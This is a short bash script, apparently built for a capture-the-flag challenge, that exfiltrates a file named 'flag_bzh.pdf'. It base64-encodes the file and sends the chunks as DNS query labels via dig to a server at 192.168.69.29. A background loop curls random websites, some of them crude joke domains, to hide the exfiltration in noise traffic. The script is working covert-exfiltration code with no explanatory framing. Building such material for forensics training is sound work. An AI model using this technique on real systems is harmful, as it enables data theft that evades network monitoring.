f="flag_bzh.pdf"
s=4
b=57
c=0

_noise(){
    URL=(
        'https://www.google.fr'
        'https://twitter.com/'
        'https://home.regit.org/'
        'https://fr.wikipedia.org/wiki/Cowabunga'
        'https://kawabunga.ca/'
        'http://www.maredsous.be/'
        'http://www.bierebel.com/styles-de-bieres-belges/bieres-d-abbaye'
        'https://www.saveur-biere.com/fr/3-biere-bouteille/type-abbaye'
        'https://www.brewdog.com/item/16/BrewDog/Punk-IPA.html'
        'https://unepetitemousse.fr/brasserie/brewdog/biere/punk-ipa'
        'http://www.efe.fr/formations/'
        'http://www.ssi.gouv.fr/'
        'http://www.synactiv.fr/'
        'http://www.gfi.fr/'
        'http://www.soprasteria.com/fr'
        'http://www.jaimelestratra.fr'
        'http://www.p0rng4y.com'
        'http://www.labretagneilpleut.fr'
        'http://www.jeanmarielepenpresident.fr'
        'http://www.marionlepentesvraimenttropbonne.fr'
        'http://www.sarkoreviens.fr'
        'http://www.hollandeflamby.com'
        'https://www.japprendsautiliserdd.fr'
        'https://www.howtodd.fr'
        'https://www.genevievedelabougne.com'
        'https://www.pamelaanderson.xx'
        'https://www.rosie.fr'
        'https://www.bonjourmadame.fr'
    )
    while sleep 1; do
        RAND=$((RANDOM%28))
        curl -s --connect-timeout 2 "${URL[RAND]}" &> /dev/null
    done
}
_noise & PID="$!"
echo "GO DNS"
for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do 
    if [[ "$c" -lt "$s"  ]]; then
        echo -ne "$i-."
        c=$(($c+1))
    else
        echo -ne "\n$i-."
        c=1
    fi
done ); do
    dig @192.168.69.29 `echo -ne $r"queuedlamour.tra"|tr "+" "*"` +short
    echo "OK"
    sleep $((RANDOM%4))
done
kill -9 $PID
echo "FIIIIIIIIIIN"
